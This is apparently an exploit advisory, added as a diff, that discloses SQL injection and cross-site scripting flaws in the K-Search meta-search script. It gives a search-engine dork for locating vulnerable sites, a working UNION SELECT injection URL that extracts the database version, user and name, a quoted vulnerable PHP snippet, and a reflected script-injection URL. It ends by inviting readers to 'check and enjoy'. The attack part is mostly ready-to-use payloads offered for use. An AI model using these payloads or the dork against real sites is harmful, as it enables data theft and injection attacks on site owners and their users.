@@ -1,0 +1,44 @@
+####################################################
+# Category: K-Search (SQL/XSS) Multiple Remote Vulnerabilities
+# Download: http://turn-k.net/k-search/demo
+
+# Dork: inurl:K-Search, Powered By K-Search
+# Author: Sangteamtham [at] hcegroup[dot]net
+# Homepage: HCE group - bug-z0ne.info
+####################################################
+
+Info:
+K-Search provides you a quick and easy way to start your own meta-search
+engine and earn money by displaying relevant sponsored results taken from
+Pay Per Click feeds or your own sponsors.
+
+Explain:
+when you have Sponsors Area Account, then you can edit your site, delelet
+your site...
+
+---------------------------------------------------------------------------------------------
+SQL Vulnerabilities:
+
+Exploit:
+
+http://localhost//index.php?req=edit&id=999999 And 1=0 UNION SELECT
+1,2,group_concat(version(),0x3a,user(),0x3a,database()),4,5,6,7,8,9,10/*
+
+---------------------------------------------------------------------------------------------
+XSS Vulnerabilities:
+$words = $wrds = preg_split('/[\W]+?/',$en['term']);
+$misspelled = $return = array();
+
+............
+$msp = implode(' ',$words);
+$msp = str_replace('</b></i> <i><b>',' ',$msp);
+$que = implode(' ',$wrds);
+$en['spell_corrected'] = '<a
+
+Exploit:
+
+http://localhost/index.php?term="><script>alert(String.fromCharCode(Your
+charcode here))<%2Fscript>&sm=Search&source=1&req=search
+
+---------------------------------------------------------------------------------------------
+Many SQL here. Check and enjoy yourself
